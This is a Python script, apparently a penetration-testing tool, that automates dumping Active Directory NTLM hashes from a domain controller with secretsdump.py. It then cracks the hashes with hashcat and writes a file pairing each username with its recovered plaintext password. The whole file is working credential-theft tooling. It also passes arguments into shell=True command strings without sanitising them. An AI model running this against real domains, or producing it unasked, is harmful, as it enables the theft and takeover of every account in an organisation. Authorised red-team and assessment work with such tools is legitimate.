import argparse
import subprocess
import re

def main():
    parser = argparse.ArgumentParser(description="Execute secretsdump.py and hashcat with provided parameters.",
                                     epilog="Usage examples:\n"
                                            "  autoNTDS.py --ntds -d domain -u username -p password -ip 192.168.1.1\n"
                                            "  autoNTDS.py --ntds --crack -d domain -u username -p password -ip 192.168.1.1 -w wordlist.txt\n"
                                            "  autoNTDS.py --passwords-to-users users_and_hashes.txt cracked.txt",
                                     formatter_class=argparse.RawTextHelpFormatter)
    
    parser.add_argument('--ntds', action='store_true', help="Dump the NTDS")
    parser.add_argument('--crack', action='store_true', help="Crack the hashes using hashcat")
    parser.add_argument('-d', '--domain', help="Domain name")
    parser.add_argument('-u', '--user', help="Username")
    parser.add_argument('-p', '--password', help="Password")
    parser.add_argument('-ip', '--ipaddress', help="IP address")
    parser.add_argument('-w', '--wordlist', help="Wordlist for hashcat")
    parser.add_argument('-r', '--rules', default=None, help="Hashcat rules")
    parser.add_argument('-O', '--optimized', action='store_true', help="Run Hashcat in optimized mode")
    parser.add_argument('--passwords-to-users', nargs=2, metavar=('USERS_AND_HASHES', 'CRACKED'), help="Match users with their cracked passwords. Use this option if you cracked the hashes elsewhere.")

    args = parser.parse_args()

    # Argument validation
    if not any([args.ntds, args.crack, args.passwords_to_users]):
        parser.error("You must specify at least one of --ntds, --crack, or --passwords-to-users")

    if args.passwords_to_users and (args.ntds or args.crack):
        parser.error("--passwords-to-users cannot be combined with --ntds or --crack")

    if args.crack and not args.ntds:
        parser.error("--crack requires --ntds to be specified")

    # Check if we are in passwords-to-users mode
    if args.passwords_to_users:
        match_passwords_to_users(args.passwords_to_users[0], args.passwords_to_users[1])
        return

    if args.ntds:
        cmd = f"secretsdump.py {args.domain}/{args.user}:'{args.password}'@{args.ipaddress} -just-dc-ntlm"
        print(f"Executing command: {cmd}")
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if "SessionError" in result.stdout:
            print("SessionError encountered during secretsdump execution. Exiting without writing any files.")
            return

        lines = result.stdout.split("\n")
        start = False
        relevant_lines = []
        nt_hashes = []

        for line in lines:
            if "[*] Using the DRSUAPI method to get NTDS.DIT secrets" in line:
                start = True
                continue

            if start and "[*] Cleaning up..." in line:
                break
            
            if start:
                if not line.startswith(("Guest", "krbtgt")) and "$:" not in line:
                    relevant_lines.append(line)
                    match = re.search(r':([a-fA-F0-9]{32}):::', line)
                    if match:
                        nt_hashes.append(match.group(1))
                        
        with open(f"{args.domain}-users-and-hashes.txt", "w") as f:
            f.write("\n".join(relevant_lines))
        
        with open(f"{args.domain}-nt-hashes.txt", "w") as f:
            f.write("\n".join(nt_hashes))

        if not args.crack:
            print(f"Hashes written to files. Exiting...")
            return

    if args.crack:
        hashcat_cmd = f"hashcat -m 1000 {args.domain}-nt-hashes.txt {args.wordlist}"
        if args.rules:
            hashcat_cmd += f" -r {args.rules}"
        if args.optimized:
            hashcat_cmd += " -O"
        
        print(f"Executing command: {hashcat_cmd}")
        result = subprocess.run(hashcat_cmd, shell=True, capture_output=True, text=True)
        
        recovered_match = re.search(r'Recovered\.\.\.\.\.\.\.\.: (\d+)/(\d+)', result.stdout)
        if recovered_match:
            recovered_hashes = int(recovered_match.group(1))
            total_hashes = int(recovered_match.group(2))
            
            if recovered_hashes > 0:
                hashcat_show_cmd = f"hashcat -m 1000 {args.domain}-nt-hashes.txt {args.wordlist} --show"
                show_result = subprocess.run(hashcat_show_cmd, shell=True, capture_output=True, text=True)

                with open(f"{args.domain}-users-and-hashes.txt", "r") as f:
                    original_data = f.readlines()
                
                hash_to_user = {re.search(r':([a-fA-F0-9]{32}):::', line).group(1): line.split(":")[0] for line in original_data}
                cracked_data = show_result.stdout.split("\n")

                cracked_users = {}
                for line in cracked_data:
                    if ":" in line:
                        hash_value, password = line.split(":")
                        user = hash_to_user[hash_value]
                        cracked_users[user] = password
                
                with open(f"{args.domain}-cracked-users.txt", "w") as f:
                    for user, password in cracked_users.items():
                        f.write(f"{user}:{password}\n")
                
                print(f"Passwords cracked! Please see {args.domain}-cracked-users.txt file for results.")
            else:
                print("No passwords were cracked.")
        else:
            print("Could not parse hashcat output.")

def match_passwords_to_users(users_and_hashes_file, cracked_file):
    with open(users_and_hashes_file, 'r') as f:
        lines = f.readlines()
    hash_to_user = {re.search(r':([a-fA-F0-9]{32}):::', line).group(1): line.split(":")[0] for line in lines}
    with open(cracked_file, 'r') as f:
        cracked_lines = f.readlines()

    hash_to_pass = {}
    for line in cracked_lines:
        split_line = line.split(":")
        if len(split_line) > 1:
            hash_to_pass[split_line[0]] = split_line[1].strip()

    cracked_users = {}
    for hash_value, password in hash_to_pass.items():
        user = hash_to_user.get(hash_value)
        if user:
            cracked_users[user] = password

    if cracked_users:
        with open("cracked-users.txt", "w") as f:
            for user, password in cracked_users.items():
                f.write(f"{user}:{password}\n")
        print("Passwords to users complete. Please see cracked-users.txt file.")
    else:
        print("Error: No matched users to passwords found.")

if __name__ == "__main__":
    main()
